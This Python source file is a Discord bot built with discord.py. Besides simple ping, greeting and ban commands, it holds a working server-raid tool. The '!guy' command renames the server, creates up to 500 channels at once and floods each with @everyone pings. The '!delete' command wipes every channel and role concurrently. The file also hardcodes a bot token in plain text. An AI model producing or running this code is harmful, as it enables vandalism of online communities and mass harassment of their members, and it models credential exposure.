import discord
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
import asyncio

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
TOKEN = 'MTI3MTk4NTAxODE4ODcyNjM1NA.G2z8fX.TidZTL_lx31AO7HRXD4PK9q5Rm6JT8o1zauhWk'

# Define intents
intents = discord.Intents.default()
intents.message_content = True  # Ensure this intent is enabled
intents.guilds = True            # Required for guild-related events

# Create a bot instance with a command prefix and intents
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot is ready. Logged in as {bot.user}')

@bot.command()
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command()
async def hi(ctx):
    await ctx.send('Hi!')

@bot.command()
@has_permissions(manage_channels=True, manage_guild=True)
async def guy(ctx):
    guild = ctx.guild

    # Change the server name
    await guild.edit(name="GUY RAID")

    async def create_channel(index):
        channel = await guild.create_text_channel(f'guy_raid_{index + 1}')
        await channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone GUY RAIDED')

    # Calculate the number of channels you can create (Discord's maximum is 500)
    max_channels = 500 - len(guild.channels)

    # Create all channels concurrently
    await asyncio.gather(*[create_channel(i) for i in range(max_channels)])

    await ctx.send(f'Changed server name to "GUY RAID" and created {max_channels} channels!')

@guy.error
async def guy_error(ctx, error):
    if isinstance(error, MissingPermissions):
        await ctx.send("You don't have permission to create channels or change the server name.")

@bot.command()
@has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f'Banned {member.mention} for reason: {reason}')

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, MissingPermissions):
        await ctx.send("You don't have permission to ban members.")

@bot.command(name="commands")
async def _help(ctx):
    help_text = """
    **Available Commands:**
    `!ping` - Replies with 'Pong!'
    `!hi` - Replies with 'Hi!'
    `!guy` - Changes the server name and creates the maximum number of channels possible (requires manage channels and manage server permissions)
    `!ban <member> [reason]` - Bans a member from the server (requires ban members permission)
    `!delete` - Deletes all channels and roles (requires manage channels permission)
    """
    await ctx.send(help_text)

@bot.command()
@has_permissions(manage_channels=True, manage_roles=True)
async def delete(ctx):
    guild = ctx.guild

    async def delete_channel(channel):
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

    async def delete_role(role):
        try:
            if role.name != "@everyone":
                await role.delete()
        except Exception as e:
            print(f"Failed to delete role {role.name}: {e}")

    # Delete all channels concurrently
    await asyncio.gather(*[delete_channel(channel) for channel in guild.channels])

    # Delete all roles concurrently
    await asyncio.gather(*[delete_role(role) for role in guild.roles])

    await ctx.send("All channels and roles have been deleted.")

@delete.error
async def delete_error(ctx, error):
    if isinstance(error, MissingPermissions):
        await ctx.send("You don't have permission to delete channels or roles.")

# Run the bot
bot.run(TOKEN)
